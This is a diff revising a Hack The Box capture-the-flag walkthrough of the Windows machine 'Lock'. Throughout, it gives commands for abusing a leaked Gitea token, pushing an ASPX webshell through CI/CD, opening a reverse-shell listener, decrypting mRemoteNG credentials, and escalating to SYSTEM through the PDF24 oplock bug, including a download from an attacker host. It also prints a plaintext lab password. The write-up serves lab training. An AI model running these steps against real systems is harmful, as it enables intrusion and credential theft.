@@ -1,111 +1,232 @@
-README.md (complete)
-# Lock – Hack The Box Walkthrough  
+# 🔒 Lock — Writeup (inksec.io)
 
-**Machine:** `Lock` | **IP:** `10.129.234.64` | **Domain:** `lock.htb`  
+**Platform:** Hack The Box
+**Domain:** `lock.htb`
+**IP:** 10.129.139.121
+**Difficulty:** Medium
+**OS:** Windows
+**Status:** Retired
+**Writeup Path:** /CTF-Writeups/HTB/Lock/README.md
+**Proof Image:** [https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/lock.png](https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/lock.png)
 
-> *All commands were run from a Kali Linux workstation unless otherwise noted.*
+> Tip: add host mapping first → `echo "10.129.139.121 lock.htb" | sudo tee -a /etc/hosts`
 
 ---
 
 ## Table of Contents
-1. [Enumeration](#enumeration)  
-2. [Initial Access – Gitea CI/CD Abuse](#initial-access)  
-3. [Privilege Escalation – PDF24 Creator (CVE‑2023‑49147)](#privilege-escalation)  
-4. [Flags](#flags)  
-5. [Lessons Learned](#lessons-learned)  
-6. [References](#references)  
+
+1. [Enumeration](#enumeration)
+2. [Initial Access — Gitea CI/CD abuse](#initial-access--gitea-cicd-abuse)
+3. [Post‑exploitation — Creds (mRemoteNG)](#post‑exploitation--creds-mremoteng)
+4. [Privilege Escalation — PDF24 Creator (CVE‑2023‑49147)](#privilege-escalation--pdf24-creator-cve‑2023‑49147)
+5. [Proofs](#proofs)
+6. [Post‑Exploitation & Cleanup](#post‑exploitation--cleanup)
+7. [Lessons Learned](#lessons-learned)
+8. [References](#references)
+9. [Command Log (raw)](#command-log-raw)
 
 ---
 
-## Enumeration  
+## Overview
 
-| Step | Command / Observation | Notes |
-|------|-----------------------|-------|
-| **Port Scan** | `nmap -sC -sV lock.htb` | Open ports: `80/tcp (http)`, `3000/tcp (Gitea)` |
-| **Web Server** | `curl -I http://lock.htb/` | ASP.NET server header |
-| **Gitea UI** | `http://lock.htb:3000` | Public repo *dev‑scripts* (Python script + comments) |
-| **Git History** | `git log` → locate commit containing `GITEA_ACCESS_TOKEN` | Token: `43ce39bb0bd6bc489284f2905f033ca467a6362f` |
-| **API Enumeration** | `python3 repos.py lock.htb` (uses env var `GITEA_ACCESS_TOKEN`) | Lists additional private repo `ellen.freeman/website` |
+Gitea on **3000/tcp** exposed a Personal Access Token (PAT) in commit history. Using that token we enumerated repos via the API and cloned the **website** repo. Pushing an **ASPX webshell** triggered CI/CD auto‑deploy → RCE as `ellen.freeman`. Looting **mRemoteNG** `config.xml` yielded RDP creds for `Gale.Dekarios`. From that session, abusing **PDF24 Creator** (CVE‑2023‑49147) with an **oplock** on its log produced a hanging **SYSTEM** console.
+
+**TL;DR chain:** PAT leak in git → repo clone via API header → ASPX webshell push → RCE (ellen) → mRemoteNG creds → RDP (Gale) → PDF24 CVE‑2023‑49147 (oplock) → **SYSTEM**.
 
 ---
 
-## Initial Access – Gitea CI/CD Abuse  
+## Enumeration
 
-1. **Clone the vulnerable repo**  
+### Rustscan / Nmap
 
-   ```bash
-   git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@lock.htb:3000/ellen.freeman/website.git
-   cd website
-Copy
-Add a webshell – grabbed ASPX webshell from GitHub (webshell-LT.aspx) and renamed it webshell.aspx.
+```bash
+export target=10.129.139.121
+rustscan --ulimit 5000 -a $target -- -sC -sV -Pn -oN scans/nmap_full
+# 80/tcp  http   (ASP.NET headers observed)
+# 3000/tcp http  Gitea
+```
 
-Commit & push
+### Web quick checks
 
-git add webshell.aspx
-git commit -m "add webshell"
-git push
-Copy
-Trigger CI/CD – the pipeline auto‑redeploys on each push, publishing webshell.aspx to http://lock.htb/webshell.aspx.
+```bash
+curl -I http://lock.htb/
+# note X-Powered-By / ASP.NET hints
+```
 
-Obtain a reverse shell – served a PowerShell reverse‑shell payload (from revshells.com).
+### Gitea — find the leaked PAT quickly
 
-# Listener on attacker machine
+```bash
+git clone http://lock.htb:3000/some/public/repo.git tmp && cd tmp
+# search for token symbol across all history
+git log --all -p -S GITEA_ACCESS_TOKEN | sed -n '1,120p'
+# (mask token in notes: 43ce39...362f)  ➜ rotate if exposed
+```
+
+### Gitea API enumeration (safer auth header)
+
+```bash
+export GITEA_PAT=43ce39bb0bd6bc48...7362f
+# list repos without embedding token in the URL
+git -c http.extraheader="Authorization: token $GITEA_PAT" \
+    ls-remote http://lock.htb:3000/ellen.freeman/website.git
+```
+
+Clone with header:
+
+```bash
+git -c http.extraheader="Authorization: token $GITEA_PAT" \
+    clone http://lock.htb:3000/ellen.freeman/website.git
+```
+
+---
+
+## Initial Access — Gitea CI/CD abuse
+
+CI/CD redeploys on push. Add a webshell and push a change:
+
+```bash
+cp ~/kits/webshells/aspx/webshell.aspx website/webshell.aspx
+cd website
+git add webshell.aspx && git commit -m "deploy webshell" && git push
+```
+
+Trigger shell:
+
+```
+http://lock.htb/webshell.aspx
+```
+
+Listener:
+
+```bash
 rlwrap nc -lvnp 4444
-Copy
-Result: interactive shell as user ellen.freeman.
+```
 
-Privilege Escalation – PDF24 Creator (CVE‑2023‑49147)
-While exploring the user’s profile we discovered:
+You should land as `ellen.freeman`.
 
-config.xml (mRemoteNG) containing an encrypted RDP credential for user Gale.Dekarios.
-Decrypted password (ty8wnW9qCKDosXo6) using the public mremoteng-decrypt tool.
-RDP access to the host as Gale.Dekarios.
-Steps to become SYSTEM
-RDP into the box with the recovered credentials
+---
 
-xfreerdp3 /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6 /v:10.129.139.121 /size:1280x720 /tls:seclevel:0 /cert:ignore
-Copy
-Identify installed PDF24 Creator – version 11.15.1 (vulnerable).
+## Post‑exploitation — Creds (mRemoteNG)
 
-Download SetOpLock utility (Google Project Zero symbolic‑link testing tools) onto the RDP session.
+Locate saved mRemoteNG config and decrypt locally:
 
-Invoke-WebRequest -Uri https://github.com/googleprojectzero/symboliclink-testing-tools/releases/download/.../SetOpLock.exe -OutFile SetOpLock.exe
-Copy
-Create an opportunistic lock on the PDF24 log file
+```powershell
+# on target (PowerShell)
+dir "$env:USERPROFILE\AppData\Roaming\mRemoteNG" -Filter *conf*.xml -Recurse
+# copy the xml to attacker, then on attacker:
+```
 
-.\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log"
-Copy
-The installer’s repair routine (msiexec /fa pdf24-creator.msi) spawns pdf24-PrinterInstall.exe as SYSTEM, which tries to write to the locked log file, leaving a SYSTEM‑level cmd.exe window hanging.
+```bash
+git clone https://github.com/kmahyyg/mremoteng-decrypt.git
+python3 mremoteng-decrypt/mremoteng_decrypt.py -rf config.xml
+# ➜ recovered: user Gale.Dekarios / pass ty8wnW9qCKDosXo6
+```
 
-Interact with the hanging SYSTEM console and spawn a SYSTEM shell
+RDP in:
 
-# Inside the opened cmd window
-whoami          # => nt authority\system
-Copy
-Read the root flag
+```bash
+xfreerdp3 /u:"Gale.Dekarios" /p:'ty8wnW9qCKDosXo6' /v:$target \
+  /size:1280x720 /tls:seclevel:0 /cert:ignore
+```
 
-type C:\Users\Administrator\Desktop\root.txt
-Copy
-Result: Full root (SYSTEM) compromise.
+---
 
-Flags
-Level	Flag
-User	HTB{3e2d99bad2f8025d1e9037829cf75da0} (captured from C:\Users\gale.dekarios\Desktop\user.txt)
-Root	HTB{a5397a3299e8f19f20dbb30e976f6f59} (captured from C:\Users\Administrator\Desktop\root.txt)
+## Privilege Escalation — PDF24 Creator (CVE‑2023‑49147)
 
-Lessons Learned
-Area	Takeaway
-CI/CD Trust Boundaries	Automated deployment pipelines that pull directly from a VCS are powerful, but they also trust anything committed. Never allow unauthenticated or low‑privilege contributors to push code that reaches production without code‑review or signing.
-Secret Management	Storing API tokens, passwords, or any secrets in plain text (e.g., Gitea access token in a commit) is a critical mistake. Use environment variables, secret vaults, or at least rotate tokens regularly.
-Service Enumeration	Simple header checks (curl -I) revealed the backend framework (ASP.NET). Knowing the tech stack narrows down useful exploits (e.g., webshells targeting ASPX).
-Privilege‑Escalation Hygiene	Keeping software up‑to‑date matters. PDF24 Creator’s vulnerability was patched in v11.15.2; the target still ran the vulnerable 11.15.1 version. Regular patch management can close this attack vector.
-Opportunistic Locks (Oplocks)	Oplocks are a lesser‑known Windows feature that can be abused for privilege escalation. Understanding low‑level OS mechanisms can yield creative post‑exploitation paths.
-Credential Dumping via Config Files	Tools like mremoteng-decrypt demonstrate that many GUI applications store credentials locally. Always audit configuration files for embedded secrets after gaining footholds.
-Defense‑in‑Depth	Relying on a single layer (e.g., network segmentation) isn’t enough. Combining host‑based IDS, file integrity monitoring, and strict least‑privilege policies would have mitigated several steps of this chain.
-References
-PDF24 Creator Privilege Escalation – CVE‑2023‑49147 – NVD
-PDF24 changelog – fix introduced in v11.15.2
-Google Project Zero – SymbolicLink Testing Tools (SetOpLock)
-mRemoteNG credential decryption – mremoteng-decrypt GitHub repo
-Hack The Box – Lock machine write‑ups (community)
-Prepared by InkSec – Your source for practical offensive security write‑ups.
+Check version:
+
+```powershell
+(Get-Item 'C:\Program Files\PDF24\pdf24-PrinterInstall.exe').VersionInfo.FileVersion
+# vulnerable ≤ 11.15.1
+```
+
+Hold an **oplock** (read lock) on the log and run repair:
+
+```powershell
+# (host SetOpLock.exe yourself to avoid outbound fetches)
+# attacker: python3 -m http.server 8000  (serve the exe)
+# target PS:
+iwr http://10.10.14.12:8000/SetOpLock.exe -OutFile $env:TEMP\SetOpLock.exe
+& $env:TEMP\SetOpLock.exe 'C:\Program Files\PDF24\faxPrnInst.log' r
+# Now open PDF24 Creator and run Repair (invokes msiexec /fa)
+```
+
+A **SYSTEM** cmd window should hang due to the oplock. Use it to spawn a proper SYSTEM shell.
+
+Prove:
+
+```powershell
+whoami  # nt authority\system
+Get-Content C:\Users\Administrator\Desktop\root.txt
+```
+
+---
+
+## Proofs
+
+```text
+user.txt: HTB{3e2d99bad2f8025d1e9037829cREDACTED}
+root.txt: HTB{a5397a3299e8f19f20dbb30e97REDACTED}
+```
+
+---
+
+## Post‑Exploitation & Cleanup
+
+* Remove webshell and redeploy a clean build.
+* Delete dropped tooling (`SetOpLock.exe`).
+* Clear recent docs/RDP artifacts as rules allow.
+* **Rotate/expire** any exposed tokens (PAT).
+
+---
+
+## Lessons Learned
+
+* CI/CD trust boundaries: never deploy unreviewed commits to prod.
+* Secrets in git history are **forever** unless rotated—scan histories for tokens.
+* Config files (mRemoteNG) often hold retrievable creds.
+* PDF24 Creator < 11.15.2 is vulnerable; update closes this path.
+* Oplocks are a potent but niche Windows primitive for privesc.
+
+---
+
+## References
+
+* CVE‑2023‑49147 (PDF24 Creator) — vendor changelog notes fix in **11.15.2**.
+* Google Project Zero symbolic‑link testing tools — `SetOpLock.exe`.
+* mRemoteNG credential decryption — `mremoteng-decrypt` utility.
+* HTB community write‑ups for "Lock" (cross‑check techniques).
+
+---
+
+## Command Log (raw)
+
+```bash
+# hosts mapping
+printf "10.129.139.121 lock.htb\n" | sudo tee -a /etc/hosts
+
+# scan
+export target=10.129.139.121
+rustscan --ulimit 5000 -a $target -- -sC -sV -Pn -oN scans/nmap_full
+curl -I http://lock.htb/
+
+# gitea history & API
+git log --all -p -S GITEA_ACCESS_TOKEN
+export GITEA_PAT=43ce39bb0bd6bc48...7362f
+git -c http.extraheader="Authorization: token $GITEA_PAT" \
+    clone http://lock.htb:3000/ellen.freeman/website.git
+
+# webshell deploy
+cp webshell.aspx website/webshell.aspx && cd website \
+  && git add webshell.aspx && git commit -m "deploy webshell" && git push
+rlwrap nc -lvnp 4444
+
+# creds (mRemoteNG)
+python3 mremoteng-decrypt.py -rf config.xml
+xfreerdp3 /u:"Gale.Dekarios" /p:'ty8wnW9qCKDosXo6' /v:$target /size:1280x720 /tls:seclevel:0 /cert:ignore
+
+# privesc (oplock)
+iwr http://10.10.14.12:8000/SetOpLock.exe -OutFile $env:TEMP/SetOpLock.exe
+$env:TEMP/SetOpLock.exe 'C:\\Program Files\\PDF24\\faxPrnInst.log' r
+whoami && type C:\\Users\\Administrator\\Desktop\\root.txt
+```
